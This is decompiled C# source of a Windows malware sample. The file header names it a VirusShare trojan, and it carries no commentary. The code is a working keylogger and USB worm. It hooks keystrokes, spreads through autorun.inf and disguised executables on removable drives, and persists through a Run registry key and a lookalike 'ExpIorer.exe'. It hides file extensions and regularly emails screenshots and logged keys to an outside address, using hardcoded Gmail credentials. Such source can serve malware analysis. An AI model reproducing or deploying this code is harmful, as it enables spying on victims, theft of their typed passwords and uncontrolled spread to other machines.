// Decompiled with JetBrains decompiler
// Type: NEW.Program
// Assembly: Service, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFC5F67E-FFB3-44CB-91D2-6EE08A1CD471
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.aywd-d6541946ef8762be97a356ab44fd07d8809f8eda.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace NEW
{
  internal static class Program
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private const int SW_HIDE = 0;
    private static string km = "";
    private static Program.LowLevelKeyboardProc _proc = new Program.LowLevelKeyboardProc(Program.HookCallback);
    private static IntPtr _hookID = IntPtr.Zero;
    private static string mreg = Path.GetRandomFileName();

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 256)
      {
        int num = Marshal.ReadInt32(lParam);
        Program.km += (string) (object) (Keys) num;
      }
      return Program.CallNextHookEx(Program._hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      Program.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private static IntPtr SetHook(Program.LowLevelKeyboardProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return Program.SetWindowsHookEx(13, proc, Program.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    private static void USBSpread(object source, EventArgs e)
    {
      List<string> stringList = new List<string>();
      string sourceFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "Service.exe");
      int index = 0;
      foreach (DriveInfo driveInfo in ((IEnumerable<DriveInfo>) DriveInfo.GetDrives()).Where<DriveInfo>((Func<DriveInfo, bool>) (x => x.IsReady && x.DriveType.ToString() == "Removable" && x.ToString() != "A:\\" && x.ToString() != "B:\\")))
      {
        if (!System.IO.File.Exists(driveInfo.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe"))
        {
          foreach (string directory in Directory.GetDirectories(driveInfo.Name))
            stringList.Add(directory);
          try
          {
            if (stringList.Count <= 0)
            {
              System.IO.File.Copy(sourceFileName, driveInfo.ToString() + "$Recycle.Bin.scr");
              return;
            }
          }
          catch
          {
          }
          try
          {
            while (stringList.Count > 0)
            {
              System.IO.File.Copy(sourceFileName, stringList[index] + ".scr", true);
              if (System.IO.File.Exists(stringList[index] + ".scr"))
              {
                System.IO.File.SetAttributes(stringList[index], System.IO.File.GetAttributes(stringList[index]) | FileAttributes.Hidden);
                break;
              }
              ++index;
            }
          }
          catch
          {
          }
          try
          {
            StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
            streamWriter.WriteLine("[autorun]\\n");
            streamWriter.WriteLine("icon=angel.ico");
            streamWriter.WriteLine("open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
            streamWriter.WriteLine("action=Run VMCLite");
            streamWriter.WriteLine("Shell\\Open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
            streamWriter.WriteLine("Shell\\Open\\Default=1");
            streamWriter.WriteLine("Shell\\Explore=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
            streamWriter.WriteLine("Shell\\Explore\\Command=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
            streamWriter.WriteLine("[autorun]\n");
            streamWriter.Close();
            System.IO.File.SetAttributes(driveInfo.Name + "autorun.inf", System.IO.File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
            driveInfo.VolumeLabel = "angel";
          }
          catch
          {
          }
          try
          {
            System.IO.File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), driveInfo.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
            System.IO.File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates).ToString(), "angel.ico"), driveInfo.Name + "angel.ico");
            System.IO.File.SetAttributes(driveInfo.Name + "autorun.inf", System.IO.File.GetAttributes(driveInfo.Name + "angel.ico") | FileAttributes.Hidden);
          }
          catch
          {
          }
        }
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", true);
        try
        {
          registryKey.DeleteValue(Program.mreg);
        }
        catch
        {
        }
        Program.mreg = Path.GetRandomFileName();
        registryKey.SetValue(Program.mreg, (object) Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
        registryKey.Close();
      }
      catch
      {
      }
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced"))
          subKey.SetValue("Hidden", (object) 0, RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced"))
          subKey.SetValue("HideFileExt", (object) 1, RegistryValueKind.DWord);
      }
      catch
      {
      }
      int num = 0;
      foreach (Process process in ((IEnumerable<Process>) Process.GetProcesses()).Where<Process>((Func<Process, bool>) (x => x.ToString() == "System.Diagnostics.Process (ExpIorer)")))
        num = 1;
      if (num != 0)
        return;
      try
      {
        Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
        Process.GetCurrentProcess().Kill();
      }
      catch
      {
      }
    }

    private static void email(object source, EventArgs e)
    {
      if (!System.IO.File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe")) && System.IO.File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db")))
        System.IO.File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), true);
      if (Directory.Exists("C:\\angel") && MessageBox.Show("Exit?", "", MessageBoxButtons.YesNo) == DialogResult.Yes)
      {
        foreach (Process process in ((IEnumerable<Process>) Process.GetProcesses()).Where<Process>((Func<Process, bool>) (x => x.ToString() == "System.Diagnostics.Process (ExpIorer.exe)")))
          process.Kill();
        Process.GetCurrentProcess().Kill();
      }
      Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
      using (Graphics graphics = Graphics.FromImage((Image) bitmap))
        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
      if (System.IO.File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall")))
        System.IO.File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
      bitmap.Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
      MailMessage message = new MailMessage();
      message.To.Add("zibayekhofte_lover2006@yahoo.com");
      message.From = new MailAddress("XtahmineX@gmail.com", "XtahmineX", Encoding.UTF8);
      message.Subject = "";
      message.SubjectEncoding = Encoding.UTF8;
      message.Body = Program.km;
      message.BodyEncoding = Encoding.UTF8;
      message.IsBodyHtml = false;
      message.Priority = MailPriority.High;
      SmtpClient smtpClient = new SmtpClient();
      smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential("XtahmineX@gmail.com", "morteza20");
      smtpClient.Port = 587;
      smtpClient.Host = "smtp.gmail.com";
      smtpClient.EnableSsl = true;
      Attachment attachment = new Attachment(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
      message.Attachments.Add(attachment);
      ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback) ((s, certificate, chain, sslPolicyErrors) => true);
      try
      {
        smtpClient.Send(message);
        Program.km = "";
      }
      catch
      {
      }
    }

    private static void Main()
    {
      string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "Service.exe");
      bool createdNew;
      Mutex mutex = new Mutex(true, Application.ProductName, out createdNew);
      if (createdNew)
      {
        mutex.ReleaseMutex();
      }
      else
      {
        if (Application.StartupPath.Length < 10)
          Process.Start("Explorer", Application.ExecutablePath.Substring(0, Application.ExecutablePath.Length - 4));
        Process.GetCurrentProcess().Kill();
      }
      try
      {
        System.IO.File.Copy(Application.ExecutablePath.ToString(), destFileName, true);
        System.IO.File.Copy(Application.ExecutablePath.ToString(), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thumbs.db"), true);
      }
      catch
      {
      }
      if (Application.StartupPath.Length < 10)
      {
        try
        {
          Process.Start("Explorer", Application.ExecutablePath.Substring(0, Application.ExecutablePath.Length - 4));
          if (System.IO.File.Exists(Application.StartupPath + "angel.ico"))
            System.IO.File.Copy(Application.StartupPath + "angel.ico", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "angel.ico"));
          if (System.IO.File.Exists(Application.StartupPath + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe"))
          {
            System.IO.File.Copy(Application.StartupPath + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
            System.IO.File.Copy(Application.StartupPath + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), true);
          }
          Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
          Process.GetCurrentProcess().Kill();
        }
        catch
        {
        }
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", true);
        foreach (string valueName in registryKey.GetValueNames())
        {
          if (registryKey.GetValue(valueName).ToString() == destFileName)
            Program.mreg = valueName;
        }
      }
      catch
      {
      }
      Program.USBSpread((object) null, (EventArgs) null);
      Program.ShowWindow(Program.GetConsoleWindow(), 0);
      Program._hookID = Program.SetHook(Program._proc);
      System.Timers.Timer timer1 = new System.Timers.Timer();
      timer1.Elapsed += new ElapsedEventHandler(Program.email);
      timer1.AutoReset = true;
      timer1.Interval = 720000.0;
      timer1.Start();
      System.Timers.Timer timer2 = new System.Timers.Timer();
      timer2.Elapsed += new ElapsedEventHandler(Program.USBSpread);
      timer2.AutoReset = true;
      timer2.Interval = 3000.0;
      timer2.Start();
      Application.Run();
      Program.UnhookWindowsHookEx(Program._hookID);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
